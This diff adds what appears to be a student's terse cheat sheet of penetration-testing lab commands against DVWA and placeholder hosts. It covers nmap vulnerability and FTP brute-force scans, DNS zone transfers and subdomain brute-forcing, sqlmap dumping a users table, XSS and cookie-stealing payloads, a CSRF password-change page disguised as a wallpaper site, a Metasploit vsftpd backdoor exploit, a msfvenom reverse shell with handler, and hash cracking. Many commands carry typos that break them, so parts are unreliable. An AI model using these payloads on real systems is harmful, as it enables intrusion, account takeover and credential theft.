@@ -1,0 +1,105 @@
+1.....
+
+2......
+sudo nmap -sn <ip>
+sudo nmap -PS <ip>
+sudo nmap -sS <ip>
+sudo nmap -sT <ip>
+sudo nmap -sU <ip>
+sudo nmap -sV <ip>
+sudo nmap -A <ip>
+sudo nmap -p 21,81 <ip>
+sudo nmap -o <ip>
+sudo nmap -sV --script vuln <ip>
+sudo nmap -sV --script ftp-brute -p21 <ip>
+
+3.....
+nslooup DNS
+dig DNS A(add)
+MX 
+TXT
+dig DNS NS  (name server)
+dig axfr @ns1.example.com example.com
+--bruteforce
+fierce --domain DNS
+gobuster dns -d DNS -w /usr/share/worldlists/subdomains-top1m.txt
+--subdomain
+sublist3r -d DNS
+amass enum -d DNS 
+
+
+5.....
+sqlmap -u "http://[DVWA_IP]/vulnerabilities/sqli/?id=1&Submit=Submit"
+--cookie="PHPSESSID=abcd1234efgh5678; security=low"
+--batch
+sqlmap -u "http://[DVWA_IP]/vulnerabilities/sqli/?id=1&Submit=Submit"
+--cookie="PHPSESSID=abcd1234efgh5678; security=low"
+--dbs
+sqlmap -u "http://[DVWA_IP]/vulnerabilities/sqli/?id=1&Submit=Submit"
+--cookie="PHPSESSID=abcd1234efgh5678; security=low"
+-D dvwa --tables
+sqlmap -u "http://[DVWA_IP]/vulnerabilities/sqli/?id=1&Submit=Submit"
+--cookie="PHPSESSID=abcd1234efgh5678; security=low"
+-D dvwa -T users --columns
+sqlmap -u "http://[DVWA_IP]/vulnerabilities/sqli/?id=1&Submit=Submit"
+--cookie="PHPSESSID=abcd1234efgh5678; security=low"
+-D dvwa -T users --dump
+
+
+6........
+
+<script>aleart("XSS")</script>
+<img src=x onerror=alear("jgj")>
+
+<script>
+window.location='http://127.0.0.1/?cookie=' + document.cookie;
+</script>
+
+CSRF
+<html>
+  <body>
+    <h1>Welcome to Free Wallpapers</h1>
+
+    <form action="http://<DVWA_IP>/dvwa/vulnerabilities/csrf/" method="GET">
+      <input type="hidden" name="password_new" value="hacked_password">
+      <input type="hidden" name="password_conf" value="hacked_password">
+      <input type="hidden" name="Change" value="Change">
+    </form>
+
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+
+7..
+namp -sV -A <ip>
+msfconsole
+searech vsftpd
+use exploii /unix/ftp/vsftpd_234_backdoor
+set RHOSTS <ip>
+show PAYLOAD
+set payload cmd/unix/interat
+run
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<target ip> LPORT=4444 -f exe >shell.exe
+
+use exploit /multi/handler
+set payload windows/meterpreter/reverse_tcp 
+set LHOST <MY IP>
+set HPORT 4444
+run
+
+
+9..........
+echo -n pasword123 | sha256sum >h.txt
+nano h.txt
+sudo john --format=Raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt --pot=none f.txt
+
+
+sudo apt purge -y pocl-opencl-icd ocl-icd-libopencl1
+sudo apt install -y ocl-icd-libopencl1 pocl-opencl-icd clinfo
+
+
+sudo hashcat -m 1400 -a 0 f.txt /usr/share/wordlists/rockyou.txt --show
